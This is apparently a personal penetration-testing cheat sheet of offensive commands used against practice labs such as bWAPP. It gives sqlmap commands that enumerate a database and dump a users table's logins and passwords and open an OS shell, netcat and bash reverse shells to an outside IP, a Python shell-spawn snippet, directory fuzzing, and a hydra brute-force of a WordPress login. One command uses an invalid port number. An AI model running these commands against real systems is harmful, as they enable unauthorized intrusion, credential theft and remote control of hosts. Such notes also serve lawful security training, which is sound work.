# Infosec
My InfoSec Cheat sheet and stuff



# scan local network

arp-scan --local

# sqlmap 

------


POST data (if data not in URL)
sqlmap --url="http://bee-box/bWAPP/slqi_1.php?title=iron" --dbs
--dbs info is found using the -hh option of sqlmap
Add --cookie="security_level=0;PHPSESSID=xxxxxx"
the bwapp app requires it
If POST then add --data="title=iron&action=search"
Input data and parameters are usually found in the request BODY
So we have a good injection point and even enumerated the name of the database,
but how do we get at the data?
Enumerate the Table names
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --tables
Enumerate Columns
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users --
columns
Dump database data from table 'users' from columns 'login' and 'password'
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users -C
login,password --dump
Any other useful tricks?
How about COMMAND EXECUTION?
sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --os-shell


----------

# nc shell

----------

nc -nvlp 9999 (attacker)

nc -nv -e /bin/bash IP PORT  OR  bash -c "bash -i >& /dev/tcp/10.10.15.94/443 0>&1"


---
# photos and metadata

exif 

exiftool 

steghide info

binwalk - tool for searching binary images for embedded files and executable code



---
# SPAWN PY SHELL

import pty
pty.spawn("/bin/sh")


-
# start quick python http server 
python3 -m http.server 80080

# fuff coz i hate gobuster 
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.142.184/FUZZ -fs 42 -c -v 

# hydra brute force WP

hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.36.107 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
